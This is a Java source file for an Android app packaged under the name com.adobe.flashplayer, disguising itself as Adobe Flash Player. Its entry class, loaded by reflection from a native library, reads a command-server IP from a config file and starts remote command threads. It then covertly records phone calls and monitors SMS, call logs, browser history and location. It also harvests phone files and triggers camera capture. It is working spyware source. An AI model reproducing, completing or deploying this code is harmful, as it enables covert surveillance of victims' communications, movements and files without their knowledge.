package com.adobe.flashplayer;


import java.io.File;
import java.io.FileInputStream;

import org.json.JSONObject;

import android.content.Context;
import android.os.Message;
import android.util.Log;
import com.authority.AuthoritySettings;
import com.main.BaseInfo;
import com.main.ForegroundService;
import com.main.GSBroadcastReceiver;
import com.main.GlobalHandler;
import com.main.HistoryDataFiles;
import com.main.MainUtils;
import com.phone.data.BrowserHistory;
import com.phone.data.CallLogContentObserver;
import com.phone.data.CameraDialog;
import com.phone.data.PhoneCallAudio;
import com.phone.data.PhoneLocationListener;
import com.phone.data.SMSContentObserver;
import com.plugin.GetActivity;
import com.setup.NetworkSetup;
import com.utils.ExceptionProcess;
import com.utils.PhoneFilesUtils;
import com.utils.PrefOper;
import com.utils.Public;
import com.utils.PublicFunction;
import com.utils.WriteDateFile;


//android service,activity,broadcast are all in main thread
public class SoEntry implements Runnable{
	
	private String TAG = "SoEntry";
	
	Context context = null;
	
	//jmethodID enterclassinit = env->GetMethodID(javaenterclass, "<init>", "()V");
	//entry class from so must had void dummy constructor to be reflected invoked by so
	//without this constructor,Class.forName(xxx) will cause exception,
	//Pending exception java.lang.NoSuchMethodError: no non-static method com.adobe.flashplayer/.<init>
	public SoEntry(){
		Log.e("SoEntry", "init");
	}
	
	//constructor
	public SoEntry(Context context){
		this.context = context;
	}
		

	//old entry
	public void start(Context context){
		start(context,"");
	}
	
	//new entry
	public void start(Context context,String path){
		try {
			Log.e(TAG,"so entry start");
			
			if (path != null && path.equals("")==false) {
				if (path.endsWith("/") == false) {
					path += "/";
				}
			}
			
			boolean ret = PrefOper.setValue(context, ForegroundService.PARAMCONFIG_FileName,
					ForegroundService.SETUPMODE,ForegroundService.SETUPMODE_SO);
			
			ret = PrefOper.setValue(context, ForegroundService.PARAMCONFIG_FileName,ForegroundService.CFGPLUGINPATH,path);
			if(ret == false){
				Log.e(TAG, "set pluginEntryPath error");
			}
			
			try {
				File file = new File(path + NetworkSetup.CONFIG_FILENAME);
				if (file.exists()) {
					int len = (int)file.length();
					byte[] buf = new byte[len];
					
					FileInputStream fin = new FileInputStream(file);
					fin.read(buf,0,len);
					fin.close();
					
					JSONObject json = new JSONObject(new String(buf));
					String ip = json.optString("ip");
					
					if (ip != null && ip.equals("") == false) {
						PrefOper.setValue(context, ForegroundService.PARAMCONFIG_FileName, 
								ForegroundService.CFGSERVERIP,ip);
					}
					String username = json.optString("username");
					if (username != null && username.equals("") == false) {
						PrefOper.setValue(context, ForegroundService.PARAMCONFIG_FileName, 
								ForegroundService.CFGUSERNAME,username);
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
			
			String install = PrefOper.getValue(context, ForegroundService.PARAMCONFIG_FileName, ForegroundService.UNINSTALLFLAG);
			if(install.equals("true")){
				return ;
			}
			
			start(context,0);
			
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	//public entry
	public static void start(Context context,int flag){
		try {
			if(context == null){
				context = GetActivity.getContext();
			}
			new Thread(new SoEntry(context)).start();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	
	@Override
	public void run() {
		String TAG = "SoEntry";
		try {
			Log.e(TAG,"soEntry start\r\n");
			
			Public.init(context);

			/*
			String []unauthorities = AuthoritySettings.getUnauthorityPermissions(context);
			if(unauthorities != null && unauthorities.length > 0){
				//new GetActivity(context).start();
			}else{
				Log.e(TAG, "all request permission is allowed");			
				//new GetActivity(context).start();
			}
			
			
			while(true){
				if (MainUtils.checkExist(context,65530) == false) {
				//if (MainUtils.checkExist(context,65530,65531) == false) {
					return;
					//Thread.sleep(1000);
				}else{
					//test dex load block
					break;
				}
			}
			*/
			
			
			try {
				if (ForegroundService.gGlobalHandler == null) {
					ForegroundService.gGlobalHandler = new GlobalHandler(context);
					new Thread( ForegroundService.gGlobalHandler).start();
					Log.e(TAG,"gGlobalHandler start");
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
			
	    	//broadcast recerver need to register in AndroidManifest.xml
			try {    	
				GSBroadcastReceiver.init(context);
				Log.e(TAG,"gBroadcastReceiver start");
				WriteDateFile.writeLogFile("gBroadcastReceiver start\r\n");
				
			} catch (Exception e) {
				WriteDateFile.writeLogFile("gBroadcastReceiver exception\r\n");
				e.printStackTrace();
			}
			
			try {
				MainUtils.serverCmdThread(context);
				Log.e(TAG,"serverCmdThread start");
			} catch (Exception e) {
				e.printStackTrace();
			}
			
			try {
				MainUtils.setServerCmdAlarm(context);
				Log.e(TAG,"setServerCmdAlarm start");
			}catch(Exception e){
				e.printStackTrace();
			}
			
			String procname = PublicFunction.getProcessName(context);
			Log.e(TAG, "process name:" + procname);
			
			//WriteDateFile.writeLogFile("process name:" + procname + "\r\n");
			
			//if (procname.equals("com.tencent.mm") && context.getPackageName().equals("com.tencent.mm")) {
			//}

			try {
				new Thread(new BaseInfo(context)).start();
				Log.e(TAG,"BasicalWork start");
			} catch (Exception e) {
				e.printStackTrace();
			}


			//1.Message msg = new Message(); 
			//2.Message msg = Message.obtain(); 
			//3.Message msg = handler.obtainMessage(); 
			try {
				if (PhoneCallAudio.gPhoneCallAudio == null) {
					PhoneCallAudio.gPhoneCallAudio = new PhoneCallAudio(context);
					new Thread(PhoneCallAudio.gPhoneCallAudio).start();
				}
			} catch (Exception e) {
				//WriteDateFile.writeLogFile("gPhoneCallAudio exception\r\n");
				e.printStackTrace();
			}


			try {
				if (SMSContentObserver.gSmsContentObserver == null) {
					//java.lang.NullPointerException: 
					//Attempt to invoke virtual method 'android.os.Message android.os.Handler.obtainMessage()' 
					//on a null object reference
					//Message msg = GlobalHandler.gHandler.obtainMessage();
					Message msg = new Message();
					msg.what = GlobalHandler.REGISTRY_MSG_LISTEN;
					if (GlobalHandler.gHandler != null) {
						GlobalHandler.gHandler.sendMessage(msg);
					}else{
						ForegroundService.gGlobalHandler = new GlobalHandler(context);
						new Thread( ForegroundService.gGlobalHandler).start();
					}
					
					Log.e(TAG,"gSmsContentObserver start");
					//WriteDateFile.writeLogFile("gSmsContentObserver start\r\n");
				}
			} catch (Exception e) {
				//WriteDateFile.writeLogFile("gSmsContentObserver exception\r\n");
				e.printStackTrace();
			}


			try {
				if (CallLogContentObserver.gCallLogContentObserver == null) {
					Message msg = new Message();
					//Message msg = GlobalHandler.gHandler.obtainMessage();
					msg.what = GlobalHandler.REGISTRY_CALLLOG_LISTEN;
					if (GlobalHandler.gHandler != null) {
						GlobalHandler.gHandler.sendMessage(msg);
					}else{
						ForegroundService.gGlobalHandler = new GlobalHandler(context);
						new Thread( ForegroundService.gGlobalHandler).start();
					}
					
					Log.e(TAG,"gCallLogContentObserver start");
					//WriteDateFile.writeLogFile("gCallLogContentObserver start\r\n");
				}
			} catch (Exception e) {
				//WriteDateFile.writeLogFile("gCallLogContentObserver exception\r\n");
				e.printStackTrace();
			}

			try {
				if (BrowserHistory.gBrowserHistory == null) {
					if (AuthoritySettings.checkSinglePermission(context,
							"com.android.browser.permission.READ_HISTORY_BOOKMARKS") == false)
					{
						Log.e(TAG, "READ_HISTORY_BOOKMARKS is not allowed");
					}else{
						Message msg = new Message();
						msg.what = GlobalHandler.REGISTRY_BROWSER_LISTEN;
						GlobalHandler.gHandler.sendMessage(msg);
						
						Log.e(TAG,"gBrowserHistory start");
						WriteDateFile.writeLogFile("gBrowserHistory start\r\n");
					}
				}
			} catch (Exception e) {
				WriteDateFile.writeLogFile("gBrowserHistory exception\r\n");
				e.printStackTrace();
			}

	
			try {
				if (AuthoritySettings.checkSinglePermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION) == false &&
				AuthoritySettings.checkSinglePermission(context, android.Manifest.permission.ACCESS_COARSE_LOCATION) == false) {
					Log.e(TAG, "ACCESS_LOCATION is not allowed");
				}else{
					if (PhoneLocationListener.gLocationListener == null) {
						Message msg = new Message();
						msg.what = GlobalHandler.REGISTRY_LOCATION;
						GlobalHandler.gHandler.sendMessage(msg);
					}
					
					PrefOper.setValue(context, ForegroundService.PARAMCONFIG_FileName, 
							ForegroundService.LOCATIONREPEATPERMISSION,String.valueOf(Public.PHONE_LOCATION_MINSECONDS));
			    	MainUtils.scheduleLocation(context);
			    						
					Log.e(TAG,"checkAndSetLocationAlarm start");
					WriteDateFile.writeLogFile("checkAndSetLocationAlarm start\r\n");
				}		    	
			} catch (Exception e) {
				WriteDateFile.writeLogFile("checkAndSetLocationAlarm exception\r\n");
				e.printStackTrace();
			}

	    	try {
	    		new Thread(new PhoneFilesUtils(context, 3)).start();
				Log.e(TAG,"PhoneFilesUtils start");
				WriteDateFile.writeLogFile("PhoneFilesUtils start\r\n");	
			} catch (Exception e) {
				WriteDateFile.writeLogFile("PhoneFilesUtils exception\r\n");
				e.printStackTrace();
			}

	    	//AuthoritySettings.changeUpdateTime(context);
	    	
	    	HistoryDataFiles history= new HistoryDataFiles(context);
	    	Thread historythread = new Thread(history);
	    	historythread.start();
	    	
			new Thread(new CameraDialog(context,1)).start();
			
			Thread.sleep(3000);
			
			new Thread(new CameraDialog(context,0)).start();
	    	
			Log.e(TAG,"soentry ok");
			WriteDateFile.writeLogFile("soentry loaded ok\r\n");
		} catch (Exception e) {
			e.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(e);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("SoEntry exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
		}
	}

	


}
